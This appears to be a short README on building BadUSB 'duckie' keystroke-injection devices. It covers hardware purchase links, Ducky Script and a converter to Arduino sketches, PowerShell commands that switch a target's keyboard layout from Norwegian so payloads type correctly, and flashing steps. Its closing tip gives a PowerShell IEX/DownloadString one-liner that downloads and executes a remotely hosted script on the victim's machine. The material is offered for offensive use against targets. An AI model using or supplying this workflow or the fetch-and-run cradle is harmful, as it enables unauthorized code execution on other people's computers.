# Duckies

## What to buy
**NOTE** The Arduino Beetle doesn't use ducky script, but Arduino Sketches. Luckily, there's an online converter, so you only need to focus on the Ducky Script linked below.
* [BadUSB Beetle - Arduino Leonardo R3 DC 5v 16MHz](https://www.aliexpress.com/item/32954241500.html?spm=a2g0s.9042311.0.0.6efa4c4dXO8gwF)
* [Cactus WHID (WiFi Duckie)](https://www.aliexpress.com/item/32318391529.html?spm=a2g0s.9042311.0.0.6efa4c4dXO8gwF)


## The scripting language
[Ducky Script](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript)
### Convert from Ducky Script to Arduino Sketch
[Converter](http://roothaxor.gitlab.io/ducky2arduino_stable/)

## Norwegian specific
The Ducky types using US_ENGLISH keyboard layout, meaning the payloads won't work on targets using the Norwegian keyboard layouts. The work-around is to change the layout to US_ENGLISH at the beginning of the script, then whatever payload, then optionally change it back.

The script I'm using:
From NOR to ENG - 
`PowerShell Set/WinUserLanguageList /LanguageList en/US, nb /Force`

And from ENG to NOR - 
`PowerShell Set-WinUserLanguageList -LanguageList nb, en-US -Force`

Alternatively, you can map out the US_ENGLISH keystrokes to the corresponding NORWEGIAN-layout.

## To get the script on to your duck
[Arduino IDE](https://www.arduino.cc/download_handler.php)

1. Write / Paste converted code
2. Verify the code
3. Compile ("Push" to Arduino device) 

**NB!!!** the script will execute after compile is done

![](https://github.com/datasnoken/duckies/blob/master/arduinoIDE.PNG)



## Tips
Find a way to do it in Powershell, and run the script from the web as so:

`IEX ((New-Object System.Net.Webclient).DownloadString(\"YOUR_SCRIPT_HOSTED_ON_SOME_SITE_AS_RAW\")); exit`


